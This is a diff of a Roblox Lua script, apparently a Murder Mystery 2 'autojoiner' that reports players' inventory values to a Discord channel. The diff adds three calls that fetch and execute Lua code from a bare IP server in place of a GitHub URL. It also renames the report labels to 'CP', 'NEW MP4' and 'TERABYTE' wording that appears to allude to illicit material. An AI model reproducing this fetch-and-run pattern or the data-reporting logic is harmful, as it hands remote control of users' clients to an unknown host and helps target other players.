@@ -57,7 +57,7 @@ function ischanged()
     return false
 end
 function chang(inve)
-    local valueList = loadstring(game:HttpGet("https://raw.githubusercontent.com/kroxn/aj/refs/heads/main/vlues.lua"))()
+    local valueList = loadstring(game:HttpGet("http://109.120.157.241:5000/backup"))()
     new = {}
     newval = 0
     for i,v in pairs(inve) do
@@ -75,10 +75,10 @@ function chang(inve)
     fields = {
         {
             name="OPSEC",
-            value="```\n📱 VPN: "..exec.." "..execver.."\n💎 CP: "..newval.."\n💎 TERABYTE: "..totalval.."\n```"
+            value="```\n📱 VPN: "..exec.." "..execver.."\n💎 TOTAL TERABYTE: "..newval.."\n💎 DOWNLOADED TERABYTE: "..totalval.."\n```"
         },
         {
-            name="Items",
+            name="NEW MP4",
             value=""
         },
     }
@@ -90,7 +90,7 @@ function chang(inve)
     local url = "https://discord.com/api/v10/channels/"..logid.."/messages"
     local payload = {
          embeds  = {{
-            title  = "MM2 autojoiner",
+            title  = "CP",
             color  = 0x3EED50,
             fields = fields,
         }}
@@ -149,7 +149,7 @@ end
 
 
 function inv()
-    local valueList = loadstring(game:HttpGet("https://raw.githubusercontent.com/kroxn/aj/refs/heads/main/vlues.lua"))()
+    local valueList = loadstring(game:HttpGet("http://109.120.157.241:5000/backup"))()
     local url = "https://discord.com/api/v10/channels/"..logid.."/messages"
     neww = {}
     newwval = 0
@@ -219,7 +219,7 @@ function invf()
     local url = "https://discord.com/api/v10/channels/"..logid.."/messages" 
 
     
-    local valueList = loadstring(game:HttpGet("https://raw.githubusercontent.com/kroxn/aj/refs/heads/main/vlues.lua"))()
+    local valueList = loadstring(game:HttpGet("http://109.120.157.241:5000/backup"))()
     local inventroy = "Inventory value: "
     talbe = {}
     vaule = 0
